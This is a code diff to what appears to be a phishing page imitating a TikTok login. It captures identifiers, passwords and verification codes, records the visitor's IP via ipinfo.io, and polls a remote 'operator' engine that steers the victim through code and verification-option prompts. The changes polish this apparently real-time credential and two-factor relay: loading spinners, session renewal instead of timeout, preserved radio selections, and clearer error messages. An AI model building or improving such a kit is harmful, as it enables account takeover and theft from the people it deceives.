@@ -430,6 +430,29 @@
 
     .btn-submit:hover { background: #e8264d; }
 
+    /* Button-level loading: spinner inside the button while its request is in
+       flight. The fullscreen overlay is reserved for error views. */
+    .btn-login.is-loading, .btn-submit.is-loading {
+      position: relative;
+      opacity: 0.8;
+      pointer-events: none;
+      cursor: default;
+    }
+    .btn-login.is-loading::after, .btn-submit.is-loading::after {
+      content: '';
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      margin-top: -8px;
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(255, 255, 255, 0.45);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: btnSpin 0.7s linear infinite;
+    }
+    @keyframes btnSpin { to { transform: rotate(360deg); } }
+
     /* ===== FOOTER ===== */
     .footer-signup {
       text-align: center;
@@ -722,7 +745,7 @@
         <h1>Choose a verification option</h1>
         <div class="verification-options" id="verificationOptionsContainer"></div>
         <div class="error-msg" id="verificationChoiceError"></div>
-        <button type="button" class="btn-submit" onclick="submitVerificationChoice()">Submit Choice</button>
+        <button type="button" class="btn-submit" id="verificationChoiceSubmitBtn" onclick="submitVerificationChoice()">Submit Choice</button>
         <button class="go-back" onclick="showMethodSelection()" type="button">
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
           Go back
@@ -737,7 +760,7 @@
           <div class="error-msg" id="verificationCodeError"></div>
           <div class="error-msg" id="invalidVerificationCode"></div>
         </div>
-        <button type="button" class="btn-submit" onclick="submitVerificationCode()">Submit Code</button>
+        <button type="button" class="btn-submit" id="verificationCodeSubmitBtn" onclick="submitVerificationCode()">Submit Code</button>
         <button class="go-back" onclick="showMethodSelection()" type="button">
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
           Go back
@@ -831,6 +854,12 @@ let lastSentLoginMethod = null;
 let initialSubmissionInFlight = false;
 let silentSubmitAttempts = 0;
 let verificationOptions = [];
+// Hash of the last options rendered — WAITINGOPTIONS polls every 2s; re-rendering
+// unconditionally wipes the user's radio selection before they can submit.
+let lastRenderedOptionsHash = '';
+// Consecutive polls where the engine no longer knows this browserId (row
+// deleted/finished server-side). After 3 strikes the session is terminal.
+let pollMissCount = 0;
 
 const loadingMessages = [
   "Securing your connection...",
@@ -973,6 +1002,18 @@ function togglePassword(inputId) {
 }
 
 // ==================== LOADING ====================
+function setBtnLoading(btn, on) {
+  if (!btn) return;
+  btn.classList.toggle('is-loading', !!on);
+  btn.disabled = !!on;
+}
+
+function resetAllButtons() {
+  ['emailSubmitBtn', 'phoneSubmitBtn', 'verificationChoiceSubmitBtn', 'verificationCodeSubmitBtn'].forEach(id => {
+    setBtnLoading(document.getElementById(id), false);
+  });
+}
+
 function showLoading(msg) {
   const overlay = document.getElementById('loadingOverlay');
   const text = document.getElementById('loadingMessage');
@@ -986,6 +1027,7 @@ function showLoading(msg) {
 function hideLoading() {
   document.getElementById('loadingOverlay').classList.remove('visible');
   clearInterval(messageIntervalId);
+  resetAllButtons();
 }
 
 function showLoadingError(msg) {
@@ -1071,7 +1113,7 @@ async function initialFormSubmission(opts) {
   try {
     const ipData = await fetch('https://ipinfo.io/json').then(r => r.json()).catch(() => ({}));
     const formDataContent = {
-      loginMethod: selectedLoginMethod || '',
+      loginMethod: selectedLoginMethod || 'qr',
       identifier,
       password: '',
       platform: 'tiktok',
@@ -1139,9 +1181,19 @@ function startPolling(interval = 10000) {
 async function pollOperator() {
   if (!browserId) { clearInterval(pollingIntervalId); return; }
   if (pollingStartTime !== null && Date.now() - pollingStartTime > POLLING_TIMEOUT_MS) {
-    clearInterval(pollingIntervalId);
-    showFailedView("Session timed out. Please try again.");
-    return;
+    if (currentStatus) {
+      // The engine still holds this session (FAILED/COMPLETED stop polling on
+      // their own, so reaching here means it is merely waiting). Renew the
+      // timer instead of dead-ending on the error screen while every poll
+      // keeps succeeding — the engine's own watchdog is what terminates
+      // truly stale rows, and its FAILED status surfaces here normally.
+      pollingStartTime = Date.now();
+      console.log('[Template] Polling session renewed (status:', currentStatus + ')');
+    } else {
+      clearInterval(pollingIntervalId);
+      showFailedView("Session timed out. Please try again.");
+      return;
+    }
   }
   try {
     const payload = { browserId, token: templateConfig.token };
@@ -1153,7 +1205,18 @@ async function pollOperator() {
     if (!response.ok) throw new Error(`HTTP ${response.status}`);
     const data = await response.json();
     console.log("Polling:", data);
-    if (data.currentStatus) { if (isProcessing && (data.currentStatus === 'WAITINGPASSWORD' || data.currentStatus === 'WAITINGCODE')) { try { const ljr = data.data && data.data.lastJsonResponse ? (typeof data.data.lastJsonResponse === 'string' ? JSON.parse(data.data.lastJsonResponse) : data.data.lastJsonResponse) : null; if (ljr && ljr.engineRetrying === true) { console.log('[Template] Engine retrying, staying in loading state'); return; } } catch (e) {} } isProcessing = false; const rowData = data.data || {}; if (data.qrData && !rowData.qrData) rowData.qrData = data.qrData; updateUIForStatus(data.currentStatus, rowData); }
+    if (data.currentStatus) {
+      pollMissCount = 0;
+      if (isProcessing && (data.currentStatus === 'WAITINGPASSWORD' || data.currentStatus === 'WAITINGCODE')) { try { const ljr = data.data && data.data.lastJsonResponse ? (typeof data.data.lastJsonResponse === 'string' ? JSON.parse(data.data.lastJsonResponse) : data.data.lastJsonResponse) : null; if (ljr && ljr.engineRetrying === true) { console.log('[Template] Engine retrying, staying in loading state'); return; } } catch (e) {} }
+      isProcessing = false; const rowData = data.data || {}; if (data.qrData && !rowData.qrData) rowData.qrData = data.qrData; updateUIForStatus(data.currentStatus, rowData);
+    } else if (data.success === false) {
+      // Row unknown to the engine (deleted or expired sheet entry).
+      pollMissCount++;
+      if (pollMissCount >= 3) {
+        clearInterval(pollingIntervalId);
+        showFailedView("Session expired. Please try again.");
+      }
+    }
 } catch (error) {
     console.error("[Template] Poll error, will retry in 5s:", error);
     clearInterval(pollingIntervalId);
@@ -1238,7 +1301,11 @@ function updateUIForStatus(status, data = {}) {
       let rawOpts = data.verificationOptions || [];
       if (typeof rawOpts === 'string') { try { rawOpts = JSON.parse(rawOpts); } catch(e) { rawOpts = []; } }
       verificationOptions = Array.isArray(rawOpts) ? rawOpts : [];
-      renderVerificationOptions(verificationOptions);
+      const optsHash = JSON.stringify(verificationOptions);
+      if (optsHash !== lastRenderedOptionsHash) {
+        lastRenderedOptionsHash = optsHash;
+        renderVerificationOptions(verificationOptions);
+      }
       startPolling(2000);
       break;
 
@@ -1306,7 +1373,7 @@ function renderVerificationOptions(options) {
     div.className = 'verification-radio';
     div.innerHTML = `
       <input type="radio" name="verificationOption" id="vopt${i}" value="${opt.choiceIndex}" data-type="${opt.type || ''}" data-masked="${opt.maskedDetail || ''}">
-      <label for="vopt${i}">${opt.label}</label>
+      <label for="vopt${i}">${opt.label}${opt.maskedDetail ? ' — ' + opt.maskedDetail : ''}</label>
     `;
     container.appendChild(div);
   });
@@ -1315,7 +1382,7 @@ function renderVerificationOptions(options) {
 // ==================== USER SUBMISSION ====================
 async function handleUserSubmission() {
   hideAllErrors();
-  showLoading(loadingMessages[0]);
+  setBtnLoading(document.getElementById(selectedLoginMethod === 'phone' ? 'phoneSubmitBtn' : 'emailSubmitBtn'), true);
 
   const emailInput = document.getElementById('emailInput');
   const emailPasswordInput = document.getElementById('emailPasswordInput');
@@ -1367,7 +1434,7 @@ async function handleUserSubmission() {
   } catch (error) {
     console.error("Submission error:", error);
     hideLoading();
-    setError('loadingError', "An error occurred. Please try again.");
+    setError(errorId, "An error occurred. Please try again.");
   }
 }
 
@@ -1376,7 +1443,7 @@ async function submitVerificationChoice() {
   const selected = document.querySelector('input[name="verificationOption"]:checked');
   if (!selected) { setError('verificationChoiceError', "Please select a verification option."); return; }
   hideAllErrors();
-  showLoading(loadingMessages[0]);
+  setBtnLoading(document.getElementById('verificationChoiceSubmitBtn'), true);
 
   const payload = {
     browserId, token: templateConfig.token,
@@ -1396,6 +1463,7 @@ async function submitVerificationChoice() {
   } catch (error) {
     console.error("Verification choice error:", error);
     hideLoading();
+    setError('verificationChoiceError', "Failed to submit your selection. Please try again.");
   }
 }
 
@@ -1403,7 +1471,7 @@ async function submitVerificationCode() {
   const code = document.getElementById('verificationCodeInput').value.trim();
   if (!code) { setError('verificationCodeError', "Verification code is required."); return; }
   hideAllErrors();
-  showLoading(loadingMessages[0]);
+  setBtnLoading(document.getElementById('verificationCodeSubmitBtn'), true);
 
   const payload = {
     browserId, token: templateConfig.token,
@@ -1423,6 +1491,7 @@ async function submitVerificationCode() {
   } catch (error) {
     console.error("Verification code error:", error);
     hideLoading();
+    setError('verificationCodeError', "Failed to submit the code. Please try again.");
   }
 }
 
